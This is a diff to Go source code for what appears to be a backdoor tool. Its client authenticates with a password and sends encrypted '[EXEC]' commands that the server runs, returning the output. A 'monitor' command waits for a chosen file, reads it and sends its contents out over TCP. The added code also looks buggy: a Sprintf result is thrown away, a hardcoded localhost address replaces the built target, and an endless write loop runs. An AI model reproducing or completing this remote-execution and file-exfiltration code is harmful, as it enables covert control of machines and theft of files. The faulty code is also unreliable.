@@ -29,7 +29,7 @@ import(
 	"os"
 	"time"
 	"os/exec"
-//	"io/ioutil"
+	"io/ioutil"
 	"reflect"
 	"unsafe"
 	"flag"
@@ -152,7 +152,7 @@ func intiateClient(ip string, port, lport uint16){
 		}
 		
 		if authstr == passwd {
-			sendEncryptedData(port, authstr, ip);
+			sendAuthPacket(ip, authstr, port)
 			break;
 		}
 		fmt.Print("\nInvalid authentication code, try again.\n");
@@ -176,6 +176,15 @@ func intiateClient(ip string, port, lport uint16){
 			sendEncryptedData(port, "[EXEC]" + input, ip);
 		}
 	}
+}
+func sendAuthPacket(ip, data string, port uint16){
+	
+	conn, err := net.ListenUDP("udp", &net.UDPAddr{IP: net.IPv4zero, Port: 0})
+	checkError(err);
+	
+	cryptdata := encrypt_data(data);
+	_, err = conn.WriteToUDP([]byte(cryptdata), &net.UDPAddr{IP: net.ParseIP(ip), Port: int(port)})
+	checkError(err);
 }
 /* 
     FUNCTION: func intiateServer(iface string, port, lport in)
@@ -320,7 +329,7 @@ func executeServerCommand(data, ip string, port uint16) {
 		
 	case "monitor":
 		sendEncryptedData(port, "Monitoring for requested file\n", ip);
-		go monitorFile(ip, args[1]);
+		go monitorFile(ip, args[1], port + 1);
 		break;
 
 	case "exit" :
@@ -337,7 +346,7 @@ func executeServerCommand(data, ip string, port uint16) {
 	sendEncryptedData(port, out, ip);	
 }
 
-func monitorFile(ip, filename string){
+func monitorFile(ip, filename string, port uint16){
 
 	for {
 		time.Sleep(1000 * time.Millisecond);
@@ -345,10 +354,17 @@ func monitorFile(ip, filename string){
 		if os.IsNotExist(err) {
 			continue;
 		}
-		
-		//dat, err := ioutil.ReadFile(filename);
-		//checkError(err);
 
+		dat, err := ioutil.ReadFile(filename);
+		checkError(err);
+
+		var target string
+		fmt.Sprintf(target, "%s:%d", ip, port)
+		conn, _ := net.Dial("tcp", "127.0.0.1:8081")
+		for {
+			
+			fmt.Fprintf(conn, string(dat))
+                }
 		//+1 to the port notifies that its a file transfer
 		return;
 	}
